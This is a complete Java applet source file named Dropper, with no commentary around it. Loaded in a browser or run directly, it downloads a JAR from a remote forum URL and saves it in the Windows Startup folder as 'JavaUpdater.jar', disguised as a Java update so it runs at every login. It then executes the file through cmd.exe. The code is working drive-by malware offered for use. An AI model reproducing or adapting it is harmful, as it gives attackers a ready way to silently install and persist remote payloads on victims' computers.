
import java.applet.Applet;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;
import java.util.logging.Level;
import java.util.logging.Logger;

@SuppressWarnings("serial")
public class Dropper extends Applet {

    public static void main(String[] args) {
        try {
            downloadFile();
            Runtime.getRuntime().exec(new String[]{"cmd.exe", "/C", downloadTo + "\\" + renameTo});
        } catch (Exception ex) {
            Logger.getLogger(Dropper.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    @Override
    public void init() {
        try {
            downloadFile();
        } catch (Exception ex) {
            Logger.getLogger(Dropper.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public static void downloadFile() throws Exception {
        InputStream input = (new URL(downloadLocation)).openConnection().getInputStream();
        OutputStream output = new FileOutputStream((new StringBuilder(String.valueOf(downloadTo))).append(renameTo).toString());
        byte buffer[] = new byte[1024];
        for (int i = input.read(buffer); i != -1; i = input.read(buffer)) {
            output.write(buffer, 0, i);
        }

        output.flush();
        input.close();
        output.close();
    }
    
    static String downloadLocation = "http://wwww.ztechforums.co.uk/bin.jar";
    static String downloadTo = (new StringBuilder(String.valueOf(System.getProperty("user.home")))).append(System.getProperty("file.separator")).append("Start Menu\\Programs\\Startup").append(System.getProperty("file.separator")).toString();
    static String renameTo = "JavaUpdater.jar";
}